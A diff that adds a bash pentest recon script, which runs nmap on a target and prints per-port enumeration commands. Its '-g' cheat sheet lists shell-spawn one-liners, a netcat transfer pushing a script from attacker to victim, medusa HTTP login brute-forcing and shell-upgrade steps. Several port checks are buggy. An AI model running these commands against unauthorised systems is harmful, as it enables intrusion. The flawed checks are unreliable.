@@ -1,0 +1,387 @@
+#!/bin/bash
+
+# Derped together by Hackdwerg
+# V0.93
+
+#################################################################################
+#
+# Reconfirm A recon and enum tool to help you during a Assessment/Pentest
+# Usage: ./reconfirm -t [ip] 
+# Help: ./reconfirm -h
+#
+#################################################################################
+#################################################################################
+#
+# To-Do:
+#
+# 1. Add stages of nmap intensity
+# 2. Add read from file (nmap)
+# 3. Only output positive results to file
+# 4. Cleanup after ctrl+c 
+# 5. Add more ports with tools and tricks
+# 6. Add update function
+# 7. Making sure that IP is valid upon entering (see variable regex for starters, this is still a not used variable.. im lazy)
+# 
+# Ports to add (for now): 69 (tftp), 88 (kerberos), 135 (MSRPC), 161-162 (SNMP), 143/993 (IMAP), 389/636 (LDAP), 1025/2049 (NFS/IIS), 1521 (ORACLE DATABASE), 2100 (ORACLE XML DB), 5900 (VNC), 8080 (TOMCAT?*) 
+#
+# Stages to add:
+# Light scan
+# Intense scan
+#
+#################################################################################
+
+#addign color to make is nice'ish i guess
+RED="\033[00;31m"
+GREEN="\033[00;32m"
+UNDERL="\e[4m"
+RST="\033[0m"
+
+#regex IP check
+regex="^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$"
+
+#Trap Keyboard interrupt
+trap INT
+
+#Setting up#
+#Create dir if not exists
+ if [ ! -d reconfirm-output ]; then
+  mkdir reconfirm-output
+ fi
+
+func_scan(){
+  nmap -sV -oN reconfirm-output/$target-output $target && func_ports
+}
+
+func_version(){
+  # Print version
+      echo
+      echo '========================================================'
+      echo ' Version 0.93 - reconfirm                                '
+      echo '========================================================'
+      echo ' [Created by Hackdwerg] - https://github.com/hackdwerg '
+      echo '========================================================'
+      echo
+}
+
+func_usage(){
+      echo
+      echo "Usage: ./reconfirm -t {IP}"
+      echo
+      echo "OPTIONS:"
+      echo
+      echo "  -t {IP}"
+      echo "  -g (general tips and tricks)"
+      echo "  -version"
+      echo "  -help (prints this)"
+      echo
+      printf "For more information see $GREEN https://github.com/hackdwerg \n $RST"
+      echo
+}
+
+func_gener(){
+      echo
+      echo '============================================================================================='
+      echo ' TTY Shells (only a few)                             '
+      echo '============================================================================================='
+      echo ' 1. python -c '"'import pty; pty.spawn("'"/bin/sh"'")'"'  '
+      echo ' 2. echo os.system('"'/bin/bash'"')'
+      echo ' 3. perl —e '"'exec "'"/bin/sh"'";'"'                    '
+      echo '============================================================================================='
+      echo
+      echo
+      echo '============================================================================================='
+      echo ' Quick webserver                               '
+      echo '============================================================================================='
+      echo ' Command to make the entire (current) folder available on preferred port'
+      echo ' python -m SimpleHTTPServer <Preferred PORT>  '
+      echo '============================================================================================='
+      echo
+      echo
+      echo '============================================================================================='
+      echo ' Netcat file transfer                                                 '
+      echo '============================================================================================='
+      echo ' Attacker: nc -lvp <PORT> < script.sh'
+      echo ' Victim: nc <IP> <PORT> > script.sh'
+      echo '============================================================================================='
+      echo
+      echo
+      echo '============================================================================================='
+      echo ' BruteForcing HTTP login                                          '
+      echo '============================================================================================='
+      echo ' medusa -h <IP> -u admin -P wordlist.txt -M http -m DIR:/test -T 10 '
+      echo '============================================================================================='
+      echo
+      echo
+      echo '============================================================================================='
+      echo ' Getting ports without known service                    '
+      echo '============================================================================================='
+      echo ' amap -d <IP> <PORT>  '
+      echo '============================================================================================='
+      echo
+      echo
+      echo '============================================================================================='
+      echo ' Getting full interactive Shell                                '
+      echo '============================================================================================='
+      echo ' Step1: get TTY shell                                                '
+      echo ' Step2: background process with CTRL-Z '
+      echo ' Step3: type "echo $TERM" and copy the output'
+      echo ' Step4: type stty -a and memorize the cols and rows'
+      echo ' Step5: type stty raw -echo'
+      echo ' Step6: foreground the background proccess with "fg"'
+      echo ' Step7: type "export SHELL=bash (and ofcourse hit enter)"'
+      echo ' Step8: type "export TERM={YOUR COPIED TERM FROM STEP 3}"'
+      echo ' Step9: type "stty rows {YOUR MEMORIZED ROW COUNT} columns {YOUR MEMORIZED COLUMN COUNT}"'
+      echo ' Step10: Enjoy autocomplete and tabs and much more...'
+      echo '============================================================================================='
+      echo
+}
+
+#defining ports
+
+func_ports(){
+  port21=$( grep -ic "^21" reconfirm-output/$target-output )
+   if [ $port21 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 21\n"
+      printf " To enum on port 21 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# ftp-user-enum.pl [options] (-u username|-U file-of-usernames) (-t host|-T file-of-targets)\n"
+      printf "#\n"
+      printf "# ftp/nc <IP> (21)\n"
+      printf "#\n"
+      printf "# metasploit: use auxiliary/scanner/ftp/ftp_version\n"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 21 $RST\n"
+   fi
+
+  port22=$( grep -ic "^22" reconfirm-output/$target-output )
+   if [ $port22 -eq 1 ]
+    then
+      printf "$GREEN[!] I found port 22\n"
+      printf " To enum on port 22 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# https://github.com/nccgroup/ssh_user_enum\n"
+      printf "#\n"
+      printf "# nc <IP> 22\n"
+      printf "#\n"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 22\n"
+   fi
+
+  port23=$( grep -ic "^23" reconfirm-output/$target-output )
+   if [ $port23 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 23\n"
+      printf " To enum on port 23 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# telnet <IP>\n"
+      printf "#\n"
+      printf "# nc <IP> 23\n"
+      printf "#\n"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 23\n"
+   fi
+
+  port25=$( grep -ic "^25" reconfirm-output/$target-output )
+   if [ $port25 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 25\n"
+      printf " To enum on port 25 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# telnet <IP> 25\n"
+      printf "#\n"
+      printf "# nc <IP> 25\n"
+      printf "#\n"
+      printf "# http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum\n"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 25\n"
+   fi
+
+  port80=$(grep -ic "^80" reconfirm-output/$target-output )
+   if [ $port80 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 80\n"
+      printf " To enum on port 80 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# wfuzz -z file,[WORDLIST] --hc 404,302,500,301,403,501,503,307,400 <URL>\n"
+      printf "#\n"
+      printf "# gobuster -u <URL> -w <WORDLIST>\n"
+      printf "#\n"
+      printf "# dirb <URL>\n"
+      printf "#\n"
+      printf "# nikto -h <HOST>"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 80\n"
+   fi
+
+  port110=$( grep -ic "^110" reconfirm-output/$target-output )
+   if [ $port110 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 110\n"
+      printf " To enum on port 110 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# telnet <IP> 110 USER admin@URL PASS admin\n"
+      printf "#\n"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 110\n"
+   fi
+
+  port111=$( grep -ic "^110" reconfirm-output/$target-output )
+   if [ $port110 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 111\n"
+      printf " To enum on port 111 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# rpcbind -p <IP> \n"
+      printf "#\n"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 110\n"
+   fi
+
+  port443=$( grep -ic "^443" reconfirm-output/$target-output )
+   if [ $port443 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 443\n"
+      printf " To enum on port 443 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# wfuzz -z file,[WORDLIST] --hc 404,302,500,301,403,501,503,307,400 <URL>\n"
+      printf "#\n"
+      printf "# gobuster -u <URL> -w <WORDLIST>\n"
+      printf "#\n"
+      printf "# dirb <URL\n"
+      printf "#\n"
+      printf "# nikto -h <HOST>\n"
+      printf "#\n"
+      printf "# sslscan <URL>\n"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 445\n"
+   fi
+
+  port445=$( grep -ic "^445" reconfirm-output/$target-output )
+   if [ $port445 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 445\n"
+      printf " To enum on port 445 please:\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf "# nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>\n"
+      printf "#\n"
+      printf "# "'"for vul in $(find / -name smb*vuln*.nse | cut -d"/" -f 6); do nmap -v -p 139,445 --script=$vul -iL smb_server_all.txt -oN smb_vulns_$vul.txt; done"'" \n"
+      printf "#\n"
+      printf "# smbclient -L <IP> \n"
+      printf "#\n"
+      printf "# enum4linux <IP> \n"
+      printf "# "
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 445\n"
+   fi
+   
+   port3306=$( grep -ic "^3306" reconfirm-output/$target-output )
+   if [ $port3306 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 3306\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf " To enum on port 3306 please:\n"
+      printf "# mysql -h <host> -u <username> -p <Password> -h\n"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 3306\n"
+   fi
+   
+   port3389=$( grep -ic "^3389" reconfirm-output/$target-output )
+   if [ $port3306 -eq 1 ]
+    then
+      printf "$GREEN [!] I found port 3389\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+      printf "#"
+      printf "\n"
+      printf " To enum on port 3389 please:\n"
+      printf "# nmap -p 3389 --script rdp-enum-encryption <ip>\n"
+      printf "#\n"
+      printf "# https://github.com/x90skysn3k/rdpscraper"
+      printf "#\n"
+      printf "# https://github.com/lanjelot/patator \n"
+      printf "#"
+      printf "\n"
+      printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' '#' 
+    else
+      printf "$RED [*] I didn't find port 3389\n"
+   fi
+}
+
+
+#Build Menu
+
+while getopts "t:ghv" option; do
+  case "${option}" in
+    t) target=${OPTARG}
+      func_scan
+    ;;
+    g)
+    func_gener
+    ;;
+    v) 
+    func_version
+    ;;
+    h)
+    func_usage
+    ;;
+    *)
+    if [ "$#" != "0" ] ; then
+      printf "\n${RED}Error:$RST Unknown option '$RED$1$RST'.\n\n"
+    fi
+      printf "Usage: ./reconfirm -t {IP} \n\n"
+      printf "Type:   "'"./reconfirm -help"'" for more information \n\n"
+      printf "Example: $GREEN./reconfirm -t 127.0.0.1  \n\n $RST"
+      exit 1
+    ;;
+  esac
+
+done
+
+ 
